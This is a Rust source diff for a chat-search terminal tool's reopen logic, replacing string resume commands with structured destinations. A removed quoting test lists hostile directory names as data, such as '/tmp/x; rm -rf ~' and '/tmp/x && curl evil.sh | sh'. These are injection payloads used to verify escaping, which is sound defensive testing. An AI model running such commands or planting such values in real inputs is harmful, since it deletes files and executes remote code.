@@ -42,11 +42,13 @@ pub fn run(
 
     match cs_tui::run(db_path, &mut sink, opts)? {
         cs_tui::Exit::Quit => Ok(()),
-        cs_tui::Exit::Open { resume_cmd, cwd, .. } => {
-            let Some(cmd) = resume_cmd else {
-                // Some conversations have no reopen path at all — a claude.ai thread is not
-                // resumable from a terminal. Saying so on stderr beats the TUI closing on
-                // Enter and appearing to do nothing, which is indistinguishable from a bug.
+        cs_tui::Exit::Open { destinations, cwd, .. } => {
+            // §6's sticky default: the table's first entry is what Enter takes when nobody is
+            // asked. The picker that chooses between several is chat-search-me9.1's.
+            let Some(dest) = destinations.into_iter().next() else {
+                // Some sources have no reopen path at all — Gemini CLI writes no resumable
+                // session. Saying so on stderr beats the TUI closing on Enter and appearing to
+                // do nothing, which is indistinguishable from a bug.
                 eprintln!("no way to reopen this conversation from here");
                 return Ok(());
             };
@@ -55,18 +57,10 @@ pub fn run(
             // `eval "$(cs tui)"` stdout is a pipe, and the agent would render into it; that
             // is the case the printing contract exists for, so it keeps printing.
             if print || !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal() {
-                match cwd {
-                    // `cd` is composed here, so the directory is *our* argument to quote.
-                    // It arrives from a transcript, meaning its contents are whatever the
-                    // source tool recorded, and this line is written to be `eval`ed — so an
-                    // unquoted `~/Documents/My Project` breaks `cd`, and a directory named
-                    // with a `;` runs whatever follows it.
-                    Some(dir) => println!("cd {} && {cmd}", shell_quote(&dir)),
-                    None => println!("{cmd}"),
-                }
+                println!("{}", dest.shell_line(cwd.as_deref()));
                 return Ok(());
             }
-            launch(&cmd, cwd.as_deref())
+            launch(&dest, cwd.as_deref())
         }
     }
 }
@@ -83,20 +77,38 @@ pub fn run(
 ///
 /// No shell is involved either. `$SHELL -lc` re-sources the whole rc chain first, and
 /// anything in there that touches the terminal lands between us and the agent.
-fn launch(cmd: &str, cwd: Option<&str>) -> Result<()> {
-    let argv = argv_for(cmd);
-    let Some((program, args)) = argv.split_first() else { return Ok(()) };
+fn launch(dest: &cs_core::Destination, cwd: Option<&str>) -> Result<()> {
+    let argv = dest.argv();
+    let Some((program, args)) = argv.split_first() else {
+        // Unreachable through `destinations`, which returns no entry rather than an empty one.
+        // Reported rather than returned quietly, so a future table entry that produces one is
+        // a message instead of an Enter that does nothing.
+        eprintln!("this conversation resolved to an empty command");
+        return Ok(());
+    };
 
     let mut command = std::process::Command::new(program);
     command.args(args);
     // The directory becomes an argument rather than a `cd` composed into a shell line, so
     // nothing in it can be read as syntax.
     if let Some(dir) = cwd {
+        // Probed first: `exec` reports a missing directory as a failure to run the *program*,
+        // which sends you looking for a broken install instead of a directory that has since
+        // been deleted. Codex writes per-conversation scratch dirs, so this is ordinary.
+        if !std::path::Path::new(dir).is_dir() {
+            anyhow::bail!("{dir} no longer exists, so {program} cannot be resumed there");
+        }
         command.current_dir(dir);
     }
 
-    // Dim, on stderr, so it is visible without polluting the stdout contract.
-    eprintln!("\x1b[2m{cmd}\x1b[0m");
+    // Dim, on stderr, so it is visible without polluting the stdout contract. NO_COLOR is
+    // honoured here as everywhere else — this line is outside the TUI, not outside the rule.
+    let line = argv.join(" ");
+    if std::env::var_os("NO_COLOR").is_some() {
+        eprintln!("{line}");
+    } else {
+        eprintln!("\x1b[2m{line}\x1b[0m");
+    }
 
     #[cfg(unix)]
     {
@@ -112,101 +124,5 @@ fn launch(cmd: &str, cwd: Option<&str>) -> Result<()> {
         // handing the terminal back while the agent is still drawing on it.
         let status = command.status().with_context(|| format!("running {program}"))?;
         std::process::exit(status.code().unwrap_or(1));
-    }
-}
-
-/// Split a stored `resume_cmd` into an argv.
-///
-/// Whitespace splitting is enough because every command the importers generate is built from
-/// an id with no spaces in it — `claude --resume <id>`, `codex resume <id>`. It is also all
-/// that *can* be done with a pre-rendered string, which is the argument `me9.3` makes for
-/// replacing the column with a structured open target; until then this is the same naive
-/// split `scripts/cs-fzf` does.
-///
-/// A URL is not a command at all — 69% of this corpus resumes that way — so it becomes an
-/// argument to the platform opener instead of a program name that would never resolve.
-fn argv_for(cmd: &str) -> Vec<String> {
-    if cmd.starts_with("http://") || cmd.starts_with("https://") {
-        let opener = if cfg!(target_os = "macos") { "open" } else { "xdg-open" };
-        return vec![opener.to_string(), cmd.to_string()];
-    }
-    cmd.split_whitespace().map(String::from).collect()
-}
-
-/// POSIX single-quote wrapping.
-///
-/// Single quotes suspend every shell expansion, so the only character needing care is `'`
-/// itself: close the quote, emit an escaped one, reopen. Unquoted values are never emitted,
-/// even when they look safe — "looks safe" is a judgement about today's corpus, and this
-/// string is written to be `eval`ed.
-///
-/// `resume_cmd` is deliberately *not* run through this. It is a whole command line rather
-/// than one argument, so quoting it would turn `claude --resume <id>` into a request to
-/// execute a file with that name. That asymmetry is a symptom of `me9.3`: a structured
-/// open-target would let this compose an argv and drop shell composition entirely.
-fn shell_quote(value: &str) -> String {
-    format!("'{}'", value.replace('\'', r"'\''"))
-}
-
-#[cfg(test)]
-mod tests {
-    use super::{argv_for, shell_quote};
-
-    #[test]
-    fn a_terminal_resume_command_becomes_a_program_and_its_arguments() {
-        assert_eq!(argv_for("claude --resume s-1"), ["claude", "--resume", "s-1"]);
-        assert_eq!(argv_for("codex resume 019f-main"), ["codex", "resume", "019f-main"]);
-    }
-
-    #[test]
-    fn a_url_becomes_an_argument_to_the_opener_rather_than_a_program() {
-        // Left alone it would be exec'd as a program name and never resolve, which is the
-        // majority of this corpus failing to open at all.
-        let argv = argv_for("https://chatgpt.com/c/conv-1");
-        assert_eq!(argv.len(), 2, "opener plus the url, and no shell in between");
-        assert!(matches!(argv[0].as_str(), "open" | "xdg-open"));
-        assert_eq!(argv[1], "https://chatgpt.com/c/conv-1");
-    }
-
-    #[test]
-    fn a_url_is_never_split_on_its_own_punctuation() {
-        // A query string can carry anything; splitting it would hand the opener arguments
-        // it never asked for.
-        let argv = argv_for("https://chatgpt.com/c/a?b=1&c=2#frag");
-        assert_eq!(argv[1], "https://chatgpt.com/c/a?b=1&c=2#frag");
-    }
-
-    #[test]
-    fn an_empty_command_yields_no_program_to_run() {
-        assert!(argv_for("   ").is_empty(), "callers must not exec an empty argv");
-    }
-
-    #[test]
-    fn a_directory_with_spaces_survives_as_one_argument() {
-        assert_eq!(shell_quote("/Users/me/My Project"), "'/Users/me/My Project'");
-    }
-
-    #[test]
-    fn shell_metacharacters_lose_their_meaning() {
-        for hostile in [
-            "/tmp/x; rm -rf ~",
-            "/tmp/x && curl evil.sh | sh",
-            "/tmp/$(whoami)",
-            "/tmp/`id`",
-            "/tmp/x\nrm -rf ~",
-        ] {
-            let quoted = shell_quote(hostile);
-            assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
-            // Nothing between the quotes can close them, which is what makes the whole
-            // value one word to the shell however it is spelled.
-            assert!(!quoted[1..quoted.len() - 1].contains('\''));
-        }
-    }
-
-    #[test]
-    fn an_embedded_quote_is_escaped_rather_than_dropped() {
-        // The one case single-quoting cannot handle by itself, and the one most likely to
-        // be got wrong: `it's` must round-trip, not silently lose a character.
-        assert_eq!(shell_quote("/tmp/it's here"), r"'/tmp/it'\''s here'");
     }
 }
